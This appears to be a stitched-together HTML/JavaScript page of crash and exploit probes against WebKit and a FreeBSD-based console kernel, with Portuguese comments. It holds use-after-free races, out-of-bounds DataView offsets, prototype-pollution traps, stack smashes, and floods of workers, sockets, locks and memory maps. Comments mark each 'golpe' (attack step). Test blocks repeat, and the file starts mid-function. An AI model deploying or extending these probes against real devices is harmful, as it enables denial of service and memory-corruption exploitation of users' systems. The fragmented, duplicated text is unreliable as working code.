                        div.requestFullscreen();
                    }
                } catch(e) {}
            };

            // Gatilho inicial
            div.requestFullscreen();
            log("Loop iniciado. Aguarde...");
        }

        // --- TESTE 3: ::backdrop Style Confusion ---
        function runBackdropCrash() {
            log("[WebKit] Atacando ::backdrop Renderer...");
            const dialog = document.createElement('dialog');
            dialog.innerText = "CRASH";
            document.body.appendChild(dialog);
            
            // Mostra como modal (ativa backdrop) e pede fullscreen
            dialog.showModal();
            dialog.requestFullscreen();
            
            setTimeout(() => {
                log("Fullscreen ativo. Destruindo estilo...");
                
                // O GOLPE: Altera o estilo do backdrop para algo pesado
                // e remove o diálogo imediatamente.
                const style = document.createElement('style');
                style.textContent = "::backdrop { filter: url(#nonexistent); }"; // Filtro inválido
                document.head.appendChild(style);
                
                dialog.close();
                document.body.removeChild(dialog);
                
                // Força recalc
                document.body.offsetHeight;
                log("Teste Backdrop concluído.");
                
            }, 500);
        }

        // --- TESTE 4: Iframe Window Handle Flood (Kernel) ---
        function runIframeFlood() {
            log("[KERNEL] Iniciando Iframe Handle Flood...");
            const container = document.getElementById('sandbox');
            let count = 0;

            const interval = setInterval(() => {
                // Cria iframe, pede fullscreen, destroi
                const ifr = document.createElement('iframe');
                container.appendChild(ifr);
                
                try {
                    // Tenta pedir fullscreen no iframe (pode falhar sem policy, mas estressa o kernel)
                    ifr.requestFullscreen().catch(()=>{});
                } catch(e) {}

                // Destroi rapidamente para causar churn de handles
                setTimeout(() => container.removeChild(ifr), 10);
                
                count++;
                if (count % 100 === 0) log(`Ciclos: ${count}`);
                
                if (count > 2000) {
                    clearInterval(interval);
                    log("Flood finalizado.");
                }
            }, 20);
        }

        // --- TESTE 5: Video Surface Swap Panic (Kernel) ---
        function runVideoPanic() {
            log("[KERNEL] Iniciando Video Surface Panic...");
            const video = document.createElement('video');
            document.body.appendChild(video);
            
            let toggle = false;
            const interval = setInterval(() => {
                try {
                    // Alterna fonte (reseta decoder)
                    video.src = toggle ? "invalid1.mp4" : "invalid2.mp4";
                    
                    // Alterna fullscreen violentamente
                    if (!document.fullscreenElement) {
                        video.requestFullscreen().catch(()=>{});
                    } else {
                        document.exitFullscreen().catch(()=>{});
                    }
                    
                    toggle = !toggle;
                } catch(e) {}
            }, 50); // 50ms = muito rápido para o driver de vídeo
            
            setTimeout(() => {
                clearInterval(interval);
                log("Video Panic Test finalizado.");
                if(document.body.contains(video)) document.body.removeChild(video);
            }, 5000);
        }

        // --- TESTE 6: Canvas GPU Buffer Race (Kernel) ---
        function runCanvasGPU() {
            log("[KERNEL] Iniciando Canvas GPU Race...");
            const canvas = document.createElement('canvas');
            // Tamanho 4K para forçar alocação grande na GPU
            canvas.width = 3840;
            canvas.height = 2160;
            document.body.appendChild(canvas);
            
            const ctx = canvas.getContext('2d');
            ctx.fillStyle = "red";
            ctx.fillRect(0,0, 3840, 2160);
            
            // Pede fullscreen
            canvas.requestFullscreen().then(() => {
                log("Canvas em Fullscreen. Redimensionando...");
                
                // O GOLPE: O compositor do Kernel está lendo o buffer 4K para mostrar na TV.
                // Nós mudamos o tamanho para 0x0 agora.
                // O driver Gnm pode tentar ler memória libertada.
                requestAnimationFrame(() => {
                    canvas.width = 0;
                    canvas.height = 0;
                    
                    // Enche a RAM com lixo
                    const filler = new Uint32Array(1024 * 1024).fill(0xDEADBEEF);
                });
                
            }).catch(e => log("Erro: " + e));
            
            setTimeout(() => {
                try { document.exitFullscreen(); } catch(e){}
                if(document.body.contains(canvas)) document.body.removeChild(canvas);
            }, 2000);
        }
 // --- TESTE 1: Fullscreen Alert Race ---
        function prepareFullscreen() {
            const el = document.getElementById('fs-target');
            el.style.display = 'block';
            log("PASSO 1: Clique na barra AZUL abaixo para iniciar a race condition.");
        }

        function triggerFsCrash() {
            const el = document.getElementById('fs-target');
            log("Solicitando Fullscreen...");
            
            // 1. Pede Fullscreen (Gesto do usuário válido)
            el.requestFullscreen().catch(e => log("FS Negado: " + e));
            
            // 2. O GOLPE: Bloqueia a thread com Alert
            // Enquanto o alerta está na tela, o compositor tenta transicionar.
            // Quando você fecha o alerta, o código remove o elemento.
            // Race: O navegador tenta dar fullscreen num elemento removido?
            setTimeout(() => {
                alert("AGORA: Feche este alerta rapidamente! O elemento será removido.");
                
                // Assim que o alerta fecha:
                if(el.parentNode) el.parentNode.removeChild(el);
                
                // Aloca lixo para corromper o heap
                const junk = new Array(10000).fill(1.1);
                log("Elemento removido. Verifique crash.");
                
                // Tenta sair
                if (document.exitFullscreen) document.exitFullscreen();
            }, 0);
        }

        // --- TESTE 2: CaretRange Layout Thrashing ---
        function runCaretCrash() {
            log("[WebKit] Iniciando Caret Layout Thrash...");
            const box = document.createElement('div');
            box.contentEditable = true;
            box.innerText = "TEXTO " + "A".repeat(1000);
            document.body.appendChild(box);
            
            let count = 0;
            const interval = setInterval(() => {
                count++;
                try {
                    // Muda o DOM
                    box.innerHTML = "<b>MUDANÇA " + Math.random() + "</b>";
                    
                    // Força cálculo de range num ponto arbitrário (x=100, y=100)
                    // Isso obriga o motor a percorrer a árvore de renderização suja
                    if (document.caretRangeFromPoint) {
                        const range = document.caretRangeFromPoint(100, 100 + (count%10));
                        if (range) {
                            // Tenta manipular o range retornado de uma árvore instável
                            range.deleteContents(); 
                        }
                    }
                    
                    if (count > 500) {
                        clearInterval(interval);
                        document.body.removeChild(box);
                        log("Teste Caret finalizado.");
                    }
                } catch(e) {
                    // Ignora erros lógicos, procura crash de memória
                }
            }, 5);
        }

        // --- TESTE 3: CSS Counter Style UAF ---
        function runCounterUAF() {
            log("[WebKit] Iniciando Counter Style UAF...");
            const style = document.createElement('style');
            document.head.appendChild(style);
            const list = document.createElement('ol');
            document.getElementById('sandbox').appendChild(list);
            
            // Cria lista
            for(let i=0; i<100; i++) {
                const li = document.createElement('li');
                li.textContent = "Item";
                list.appendChild(li);
            }
            
            let i = 0;
            const interval = setInterval(() => {
                i++;
                // Redefine o estilo do contador violentamente
                style.textContent = `
                    @counter-style crash${i} { system: cyclic; symbols: "X"; suffix: " "; }
                    ol { list-style: crash${i}; }
                `;
                
                // Força layout
                const h = list.offsetHeight;
                
                // O GOLPE: Remove a regra e força outro layout imediatamente
                style.textContent = "";
                const h2 = list.offsetHeight;
                
                if (i > 100) {
                    clearInterval(interval);
                    log("Counter Test finalizado.");
                    document.head.removeChild(style);
                    document.getElementById('sandbox').innerHTML = "";
                }
            }, 10);
        }

        // --- TESTE 4: LocalStorage I/O Deadlock (Kernel) ---
        function runStorageThrash() {
            log("[KERNEL] Iniciando Storage I/O Thrash...");
            
            const workerCode = `
                setInterval(() => {
                    try {
                        // Escreve chave gigante
                        const key = "flood_" + Math.random();
                        const val = "A".repeat(1024 * 50); // 50KB
                        // Operação síncrona de disco no WebKit legado
                        localStorage.setItem(key, val);
                        localStorage.removeItem(key);
                    } catch(e) {}
                }, 1);
            `;
            const blob = new Blob([workerCode], {type:"text/javascript"});
            const url = URL.createObjectURL(blob);
            
            // Lança 20 Workers a escrever no disco simultaneamente
            for(let i=0; i<20; i++) new Worker(url);
            
            log("20 Workers a martelar o disco. Sistema pode congelar.");
        }

        // --- TESTE 5: Fetch Keep-Alive Exhaustion (Kernel) ---
        function runSocketHold() {
            log("[KERNEL] Iniciando Socket Exhaustion...");
            
            let count = 0;
            const interval = setInterval(() => {
                for(let i=0; i<20; i++) {
                    // Tenta conectar a portas fechadas ou IPs lentos
                    // O Kernel aloca o socket e espera o timeout (60s+)
                    fetch("http://192.168.1.254:" + (1000+count), { 
                        keepalive: true,
                        mode: 'no-cors'
                    }).catch(()=>{});
                    count++;
                }
                
                if (count % 500 === 0) log(`Sockets alocados: ${count}`);
                
                if (count > 5000) {
                    clearInterval(interval);
                    log("Limite de teste atingido. Verifique rede.");
                }
            }, 50);
        }

        // --- TESTE 6: Worker Atomics Wait (Kernel Memory) ---
        function runThreadSleep() {
            log("[KERNEL] Iniciando Thread Deep Sleep...");
            
            if (!window.SharedArrayBuffer) {
                log("SharedArrayBuffer necessário para Atomics. Pule este teste.");
                // Fallback: Usa loop infinito simples se SAB não existir
                return; 
            }
            
            const sab = new SharedArrayBuffer(4);
            const int32 = new Int32Array(sab);
            
            const workerCode = `
                onmessage = (e) => {
                    const i32 = new Int32Array(e.data);
                    // Coloca a thread para dormir no Kernel (futex wait)
                    // Isso consome recursos de agendamento
                    Atomics.wait(i32, 0, 0);
                };
            `;
            const blob = new Blob([workerCode], {type:"text/javascript"});
            const url = URL.createObjectURL(blob);
            
            // Cria 100 threads dorminhocas
            for(let i=0; i<100; i++) {
                const w = new Worker(url);
                w.postMessage(sab);
            }
            log("100 Threads em espera no Kernel.");
        }
 // --- TESTE 1: SVG Marker Infinite Recursion ---
        // Cria um marcador que contém um objeto que usa o próprio marcador.
        function runSVGMarkerCrash() {
            log("[WebKit] Criando SVG Marker Cycle...");
            const container = document.getElementById('svg-area');
            container.innerHTML = "";
            container.style.display = "block";

            const ns = "http://www.w3.org/2000/svg";
            const svg = document.createElementNS(ns, "svg");
            const defs = document.createElementNS(ns, "defs");
            const marker = document.createElementNS(ns, "marker");
            
            marker.setAttribute("id", "crash-marker");
            marker.setAttribute("refX", "5");
            marker.setAttribute("refY", "5");
            
            // O GOLPE: O caminho dentro do marcador usa o próprio marcador
            const path = document.createElementNS(ns, "path");
            path.setAttribute("d", "M0,0 L10,10");
            path.setAttribute("marker-end", "url(#crash-marker)"); // Ciclo!
            
            marker.appendChild(path);
            defs.appendChild(marker);
            svg.appendChild(defs);
            
            // Elemento visível para disparar a renderização
            const line = document.createElementNS(ns, "line");
            line.setAttribute("x1", "0"); line.setAttribute("y1", "0");
            line.setAttribute("x2", "100"); line.setAttribute("y2", "100");
            line.setAttribute("stroke", "red");
            line.setAttribute("marker-end", "url(#crash-marker)");
            
            svg.appendChild(line);
            container.appendChild(svg);
            
            log("Renderização SVG solicitada...");
            
            // Força layout
            setTimeout(() => {
                const box = line.getBBox();
                log("SVG sobreviveu.");
                container.innerHTML = "";
                container.style.display = "none";
            }, 500);
        }

        // --- TESTE 2: CSS @counter-style Cyclic Crash ---
        // Cria estilos de contador interdependentes.
        function runCounterStyleCrash() {
            log("[WebKit] Injetando CSS Counter Cycle...");
            
            const style = document.createElement('style');
            // Define ciclo A -> B -> A
            style.textContent = `
                @counter-style A { system: extends B; symbols: 'X'; suffix: '.'; }
                @counter-style B { system: extends A; symbols: 'Y'; suffix: '.'; }
                ol { list-style: A; }
            `;
            document.head.appendChild(style);
            
            const list = document.getElementById('counter-list');
            list.innerHTML = "<li>Item 1</li><li>Item 2</li>";
            
            log("Forçando cálculo de lista...");
            // A leitura do offsetHeight força o motor a resolver os símbolos da lista
            const h = list.offsetHeight;
            
            log("Estilo sobreviveu.");
            document.head.removeChild(style);
            list.innerHTML = "";
        }

        // --- TESTE 3: AbortSignal Listener UAF ---
        // Remove listener durante a execução.
        function runAbortUAF() {
            log("[WebKit] Iniciando AbortSignal UAF...");
            
            const controller = new AbortController();
            const el = document.createElement('div');
            
            function handler() {
                log("Evento disparado. Abortando...");
                // O GOLPE: Sinaliza aborto. 
                // O WebKit deve remover este listener da lista imediatamente.
                // Se o loop de eventos ainda estiver a iterar sobre este listener, crash.
                controller.abort();
                
                // Tenta alocar memória para corromper
                const arr = new Array(1000).fill(1.1);
            }
            
            // Adiciona listener com sinal
            el.addEventListener('click', handler, { signal: controller.signal });
            
            log("Disparando evento...");
            el.dispatchEvent(new Event('click'));
            
            log("Evento processado (Seguro).");
        }

        // --- TESTE 4: Console.trace Kernel Buffer Flood ---
        // Spama logs com stack traces gigantes.
        function runConsoleTraceFlood() {
            log("[KERNEL] Iniciando Console Trace Flood...");
            
            let depth = 0;
            function recurse() {
                depth++;
                if (depth < 5000) {
                    recurse();
                } else {
                    log("Profundidade 5000 atingida. Imprimindo trace...");
                    // Gera um trace de 5000 linhas
                    console.trace("KERNEL BUFFER STRESS TEST");
                }
            }
            
            // Executa em loop para encher o buffer de log do sistema
            const interval = setInterval(() => {
                depth = 0;
                try { recurse(); } catch(e) {}
                
                // Limite
                if (Math.random() > 0.95) {
                    clearInterval(interval);
                    log("Trace Flood finalizado.");
                }
            }, 100);
        }

        // --- TESTE 5: SharedWorker Name Collision Storm ---
        // Cria conflitos na tabela de processos.
        function runWorkerNameCollision() {
            log("[KERNEL] Iniciando SharedWorker Collision...");
            
            if (!window.SharedWorker) return log("API não suportada.");
            
            const workers = [];
            let count = 0;
            
            const interval = setInterval(() => {
                // Tenta conectar ao MESMO nome de worker com parâmetros diferentes
                // O Kernel tem de decidir se reutiliza o processo ou cria novo
                const name = "conflict_worker";
                try {
                    const w = new SharedWorker("data:text/javascript,onconnect=function(e){}", name + "?id=" + count);
                    workers.push(w);
                } catch(e) {}
                
                count++;
                if (count % 100 === 0) log(`Conexões: ${count}`);
                
                if (count > 2000) {
                    clearInterval(interval);
                    log("Collision Test finalizado.");
                }
            }, 5);
        }

        // --- TESTE 6: Atomics.notify Futex Panic ---
        // Envia valores inválidos para a syscall de sincronização.
        function runFutexCrash() {
            log("[KERNEL] Iniciando Futex (Atomics) Crash...");
            
            if (!window.SharedArrayBuffer) return log("SAB não suportado.");
            
            const sab = new SharedArrayBuffer(1024);
            const int32 = new Int32Array(sab);
            
            // Worker que espera (Wait)
            const workerCode = `
                onmessage = (e) => {
                    const i32 = new Int32Array(e.data);
                    // Entra em espera no índice 0
                    Atomics.wait(i32, 0, 0);
                };
            `;
            const w = new Worker(URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"})));
            w.postMessage(sab);
            
            // Thread principal notifica (Notify)
            setTimeout(() => {
                log("Enviando notificações tóxicas...");
                try {
                    // Notifica com count gigante (Overflow interno?)
                    Atomics.notify(int32, 0, 0xFFFFFFFF);
                    
                    // Notifica em índice fora do buffer (OOB Access no Kernel?)
                    // Nota: JS verifica limites, mas se houver JIT bug, passa o valor raw
                    // Tentamos usar um TypedArray.subarray para enganar o offset
                    const sub = int32.subarray(0, 1);
                    Atomics.notify(sub, 0, 1);
                    
                    log("Futex syscall sobreviveu.");
                } catch(e) {
                    log("Erro Atomics: " + e.message);
                }
                w.terminate();
            }, 500);
        }
 // --- TESTE 1: Array.reverse Prototype Trap ---
        function runReverseTrap() {
            log("[WebKit] Iniciando Reverse Trap...");
            
            try {
                const arr = [1, 2, 3, 4];
                
                // Polui o protótipo para interceptar leituras durante o reverse
                // O reverse lê os índices para trocar. Se não encontrar no próprio array, vai ao protótipo.
                Object.defineProperty(Array.prototype, "1", {
                    get: function() {
                        log("Prototype getter ativado! Corrompendo array...");
                        arr.length = 0; // Esvazia o array original
                        // Tenta encher a memória
                        arr.push(0x41414141);
                        return "TRAP";
                    },
                    configurable: true
                });

                log("Executando reverse()...");
                // O algoritmo C++ pode não esperar que o array mude de tamanho durante a troca
                arr.reverse();
                
                log("Reverse concluído (Seguro).");
                
            } catch(e) {
                log("Erro Reverse: " + e.message);
            } finally {
                delete Array.prototype["1"]; // Limpeza
            }
        }

        // --- TESTE 2: RegExp Recursive Execution ---
        function runRegexRecursion() {
            log("[WebKit] Iniciando RegExp Recursion...");
            
            const re = /a/;
            let depth = 0;
            
            // Getter em 'input' que chama exec recursivamente
            Object.defineProperty(re, 'lastIndex', {
                get: function() {
                    depth++;
                    if (depth < 2000) {
                        // Recursão dentro do motor
                        re.exec("a");
                    }
                    return 0;
                }
            });

            try {
                log("Executando regex recursiva...");
                re.exec("a");
                log("RegExp sobreviveu.");
            } catch(e) {
                log("Erro (Stack Guard): " + e.message);
            }
        }

        // --- TESTE 3: TreeWalker Removal UAF ---
        function runWalkerUAF() {
            log("[WebKit] Iniciando TreeWalker UAF...");
            const root = document.createElement('div');
            root.innerHTML = "<div id='target'>Target</div>";
            document.body.appendChild(root);
            
            const walker = document.createTreeWalker(root, NodeFilter.SHOW_ELEMENT, {
                acceptNode: function(node) {
                    if (node.id === 'target') {
                        log("Filtro visitando alvo. Removendo...");
                        // Remove o nó atual
                        node.parentNode.removeChild(node);
                        // Tenta corromper memória
                        const junk = new Array(1000).fill(1.1);
                        return NodeFilter.FILTER_ACCEPT;
                    }
                    return NodeFilter.FILTER_SKIP;
                }
            });

            try {
                walker.nextNode(); // Deve ir para o 'target' e disparar o filtro
                // O walker tenta retornar o nó que acabou de ser removido?
                log("Walker sobreviveu.");
            } catch(e) {
                log("Erro Walker: " + e.message);
            }
            document.body.removeChild(root);
        }

        // --- TESTE 4: Console Logging Deadlock (Kernel) ---
        function runConsoleDeadlock() {
            log("[KERNEL] Iniciando Console Deadlock...");
            
            const workerCode = `
                setInterval(() => {
                    // String gigante para segurar o mutex do log por mais tempo
                    const s = "LOG_STRESS_" + Math.random() + "A".repeat(5000);
                    console.log(s);
                    console.warn(s); // Tenta usar canais diferentes
                }, 0);
            `;
            const blob = new Blob([workerCode], {type: "text/javascript"});
            const url = URL.createObjectURL(blob);
            
            // Lança 20 workers para competir pelo lock
            for(let i=0; i<20; i++) {
                new Worker(url);
            }
            log("20 Workers a bombardear o driver de log. Verifique lentidão.");
        }

        // --- TESTE 5: BroadcastChannel Name Flood (Kernel) ---
        function runBroadcastFlood() {
            log("[KERNEL] Iniciando Broadcast Name Flood...");
            
            const channels = [];
            let count = 0;
            
            const interval = setInterval(() => {
                for(let i=0; i<100; i++) {
                    try {
                        // Nomes longos e únicos para estressar a tabela de nomes IPC
                        const name = "ch_" + count + "_long_name_" + "A".repeat(100) + Math.random();
                        const bc = new BroadcastChannel(name);
                        channels.push(bc);
                        count++;
                    } catch(e) {
                        clearInterval(interval);
                        log("Limite atingido: " + e.message);
                        return;
                    }
                }
                
                if (count % 1000 === 0) log(`Canais criados: ${count}`);
                
                if (count > 50000) {
                    clearInterval(interval);
                    log("Flood finalizado.");
                }
            }, 10);
        }

        // --- TESTE 6: Worker Transfer Stack Smash (Kernel) ---
        function runTransferChain() {
            log("[KERNEL] Iniciando Transfer Chain...");
            
            const workerCode = `
                self.onmessage = function(e) {
                    // Passa a batata quente
                    if (e.data.port) {
                        e.data.port.postMessage("next");
                    }
                };
            `;
            const blob = new Blob([workerCode], {type: "text/javascript"});
            const url = URL.createObjectURL(blob);
            
            const workers = [];
            // Cria cadeia de 50 workers
            for(let i=0; i<50; i++) workers.push(new Worker(url));
            
            // Tenta passar uma mensagem através de todos recursivamente?
            // Ou enviar a mesma porta para todos
            const mc = new MessageChannel();
            
            // Tenta enviar a porta para o primeiro, que manda pro segundo...
            // (Simulado aqui por envio massivo de portas)
            log("Enviando portas em massa...");
            
            for(let i=0; i<50; i++) {
                const ch = new MessageChannel();
                workers[i].postMessage({port: ch.port2}, [ch.port2]);
            }
            
            log("Teste de transferência concluído.");
        }
// --- TESTE 1: DataView Offset Wrap-Around ---
        function runDataViewOOB() {
            log("[WebKit] Iniciando DataView OOB...");
            
            try {
                const buf = new ArrayBuffer(1024);
                // Offset perigoso: 2^32 - 16
                // Se somado ao endereço base em 32-bit, pode dar wrap-around
                const offset = 4294967280; 
                
                log(`Tentando criar DataView com offset ${offset}...`);
                
                // O GOLPE: Se a validação falhar, o ponteiro aponta para memória antes do buffer
                const view = new DataView(buf, offset, 16);
                
                log("ALERTA: DataView criado! Lendo...");
                const val = view.getUint8(0);
                log(`Valor lido: ${val} (Leak?)`);
                
            } catch(e) {
                // RangeError é a proteção correta
                log("Resultado: " + e.message);
            }
        }

        // --- TESTE 2: Function.apply Stack Smash ---
        function runApplySmash() {
            log("[WebKit] Iniciando Stack Smash...");
            
            try {
                // Cria array gigante para argumentos
                // 1 milhão de argumentos * 8 bytes = 8MB de stack (muito mais que o limite)
                const args = new Array(1000000).fill(1);
                
                function target() { return "Sobrevivi"; }
                
                log("Executando apply com 1M argumentos...");
                target.apply(null, args);
                
                log("Stack sobreviveu.");
                
            } catch(e) {
                // RangeError: Maximum call stack size exceeded é normal (JS).
                // Crash é o objetivo (C++).
                log("Erro: " + e.message);
            }
        }

        // --- TESTE 3: RegExp Lookbehind Overflow ---
        function runRegexLookbehind() {
            log("[WebKit] Iniciando RegExp Lookbehind...");
            
            try {
                // Padrão com lookbehind positivo gigante
                // Força bufferização de caracteres anteriores
                const pattern = "(?<=(" + "a".repeat(5000) + "))b";
                const re = new RegExp(pattern);
                
                const str = "a".repeat(5000) + "b";
                
                log("Executando Regex complexa...");
                re.exec(str);
                
                log("RegExp sobreviveu.");
                
            } catch(e) {
                log("Erro: " + e.message);
            }
        }

        // --- TESTE 4: Kernel Semaphore/Lock Exhaustion ---
        function runLockExhaustion() {
            log("[KERNEL] Iniciando Lock Exhaustion...");
            
            if (!navigator.locks) return log("WebLocks API não suportada.");
            
            let count = 0;
            const limit = 20000;
            
            const interval = setInterval(() => {
                for(let i=0; i<100; i++) {
                    // Solicita locks e NUNCA solta (Promise pendente)
                    navigator.locks.request("lock_" + count, new Promise(() => {}));
                    count++;
                }
                
                if (count % 1000 === 0) log(`Locks adquiridos: ${count}`);
                
                if (count >= limit) {
                    clearInterval(interval);
                    log("Limite atingido. Verifique se o sistema responde.");
                }
            }, 10);
        }

        // --- TESTE 5: VM Map Entry Exhaustion (Panic) ---
        function runMapExhaustion() {
            log("[KERNEL] Iniciando VM Map Flood...");
            
            const maps = [];
            // Limite típico do FreeBSD
            const limit = 200000; 
            
            const interval = setInterval(() => {
                try {
                    // SharedArrayBuffer força criação de mapa VM separado
                    // Se SAB não existir, ArrayBuffer normal pode usar heap contíguo (menos eficaz)
                    const buf = new (window.SharedArrayBuffer || ArrayBuffer)(4096);
                    maps.push(buf);
                    
                    if (maps.length % 5000 === 0) log(`Mapas VM: ${maps.length}`);
                    
                    if (maps.length >= limit) {
                        clearInterval(interval);
                        log("Flood finalizado.");
                    }
                } catch(e) {
                    clearInterval(interval);
                    log("Erro Alloc: " + e.message);
                }
            }, 5);
        }

        // --- TESTE 6: Socket Send Buffer Deadlock ---
        function runSocketDeadlock() {
            log("[KERNEL] Iniciando Socket Deadlock...");
            
            const ws = new WebSocket("wss://echo.websocket.org"); // Echo server
            const data = new Uint8Array(1024 * 1024).fill(0x41); // 1MB
            
            ws.onopen = () => {
                log("Conectado. Enchendo buffer de saída...");
                
                const interval = setInterval(() => {
                    // Envia sem parar. Se o Kernel não bloquear o JS, 
                    // o buffer de socket (mbuf) enche até estourar a memória do Kernel.
                    if (ws.bufferedAmount < 50 * 1024 * 1024) {
                        ws.send(data);
                    } else {
                        // Se o buffer está cheio, o Kernel está pressionado
                        log(`Buffer: ${(ws.bufferedAmount/1024/1024).toFixed(1)}MB`);
                    }
                }, 10);
            };
        }
// --- TESTE 1: DataTransfer ItemList UAF ---
        function runDataTransferUAF() {
            log("[WebKit] Iniciando DataTransfer UAF...");
            
            try {
                const dt = new DataTransfer();
                dt.items.add("data", "text/plain");
                
                // Simula evento de drag (requer manual ou script sintético)
                // Tentamos acessar a lista enquanto modificamos
                const item = dt.items[0];
                
                // O GOLPE: Remove todos os itens
                dt.items.clear();
                
                // Tenta acessar propriedades do item que agora está "órfão"
                // O WebKit pode ter libertado a estrutura interna
                const kind = item.kind; 
                log("Item acessado após clear (Tipo: " + kind + ")");
                
                // Tenta forçar uso interno
                item.getAsString(() => {});
                
            } catch(e) {
                log("Erro DataTransfer: " + e.message);
            }
        }

        // --- TESTE 2: FontFace Loading Race ---
        function runFontLoadRace() {
            log("[WebKit] Iniciando FontFace Race...");
            
            // Fonte válida (base64)
            const fontData = "d09GRgABAAAAAAQwAA4AAAAAA9gAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAABPUy8yAAABRAAAAEQAAABWNsEyg2NtYXAAAAGMAAAAOAAAAFgCqwGjY3Z0IAAAAcQAAAAIAAAACAAAAABmcGdtAAABzAAAAAMAAAADADIH02dseWYAAAHQAAAAJAAAACQ0j4A0aGVhZAAAAdwAAAAuAAAANgl2oIdoaGVhAAAB/AAAABUAAAAkCAEEAmhtdHgAAAIMAAAABwAAAAcACAAAbG9jYQAAAhQAAAAEAAAABAAGAABtYXhwAAACGAAAACAAAAAgAAwAHW5hbWUAAAI4AAAAOQAAAE55qGsucG9zdAAAAowAAAATAAAAIP+fADR4nGNgZGBg4GLQY7BhYYrIzPMJ4jM0MvCxMDGwM3GwMzEwMDExgMAJAQ4GhgQYwAAAFgACeJxjYGRgYOAAohmgkImBgYFhBZA+A8QCUOQOAAiYAFQAAAB4nGNgZGBg4ANiCQYQYGJgBMIGIGYB8xgABPwAPgAAAHicY2BkYGDgAWIxIGYC8xgXBvIYgGgAFA4AbgAAAHicY2BmAAI=";
            const url = "url(data:font/woff;base64," + fontData + ")";
            
            const font = new FontFace("RaceFont", url);
            document.fonts.add(font);
            
            const div = document.createElement('div');
            div.style.fontFamily = "RaceFont";
            div.innerText = "TEST";
            document.body.appendChild(div);
            
            // Inicia carregamento
            const p = font.load();
            
            // O GOLPE: Destrói tudo imediatamente
            // Tenta ganhar a corrida contra a thread de decode
            setTimeout(() => {
                document.fonts.delete(font);
                document.body.removeChild(div);
                // Força GC
                const junk = new Array(10000).fill(1.1);
            }, 0);
            
            p.then(() => log("Fonte carregada (Seguro)."), 
                 e => log("Erro Load: " + e));
        }

        // --- TESTE 3: History Deep Stack Smash ---
        function runHistoryDeepStack() {
            log("[WebKit] Criando Deep Object para History...");
            
            let root = { next: null };
            let curr = root;
            // 30.000 níveis de profundidade
            // O serializador recursivo deve estourar a stack
            for(let i=0; i<30000; i++) {
                curr.next = { val: i, next: null };
                curr = curr.next;
            }
            
            try {
                log("Enviando objeto profundo...");
                history.pushState(root, "Crash");
                log("History sobreviveu.");
            } catch(e) {
                log("Erro (Stack Guard): " + e.message);
            }
        }

        // --- TESTE 4: getaddrinfo Stack Overflow (Kernel) ---
        function runDNSOverflow() {
            log("[KERNEL] Iniciando DNS Hostname Overflow...");
            
            // Cria um nome de domínio maior que o buffer de stack típico (ex: 4KB)
            // RFC diz 255, mas libs internas podem processar strings maiores antes de validar
            const hugeDomain = "A".repeat(5000) + ".com";
            
            try {
                log("Resolvendo domínio gigante...");
                fetch("http://" + hugeDomain).catch(e => {});
                
                // Tenta também via WebSocket para variar a syscall
                new WebSocket("ws://" + hugeDomain);
                
                log("Chamada de rede feita (Seguro).");
            } catch(e) {
                log("Erro DNS: " + e.message);
            }
        }

        // --- TESTE 5: Atomics.wait CondVar Panic (Kernel) ---
        function runCondVarRace() {
            log("[KERNEL] Iniciando CondVar Destruction Race...");
            
            if (!window.SharedArrayBuffer) return log("SAB não suportado.");
            
            const sab = new SharedArrayBuffer(4);
            const i32 = new Int32Array(sab);
            
            const workerCode = `
                onmessage = (e) => {
                    const i32 = new Int32Array(e.data);
                    // Dorme na CondVar do Kernel
                    Atomics.wait(i32, 0, 0);
                };
            `;
            const url = URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"}));
            
            // Lança e mata workers em loop rápido
            let count = 0;
            const interval = setInterval(() => {
                const w = new Worker(url);
                w.postMessage(sab);
                
                // Mata enquanto está a entrar no estado de espera
                // Isso estressa a limpeza da CondVar no Kernel
                setTimeout(() => w.terminate(), Math.random() * 5);
                
                count++;
                if (count > 50) {
                    clearInterval(interval);
                    log("Teste CondVar finalizado.");
                }
            }, 50);
        }

        // --- TESTE 6: Console Mutex Double Unlock (Kernel) ---
        function runMutexDoubleFree() {
            log("[KERNEL] Iniciando Console Mutex Attack...");
            
            const workerCode = `
                setInterval(() => {
                    // Usa console.log massivamente para segurar o lock
                    console.log("LOCK_TEST_" + "X".repeat(1000));
                }, 0);
            `;
            const url = URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"}));
            
            const workers = [];
            // Cria 50 workers
            for(let i=0; i<50; i++) workers.push(new Worker(url));
            
            log("50 Workers ativos. Terminando em massa...");
            
            // Mata todos de uma vez
            // O Kernel tem de limpar 50 threads que podem estar a tentar libertar o mesmo lock de log
            setTimeout(() => {
                workers.forEach(w => w.terminate());
                log("Workers terminados. Verifique estabilidade.");
            }, 2000);
        }

    </script>
</body>
</html>
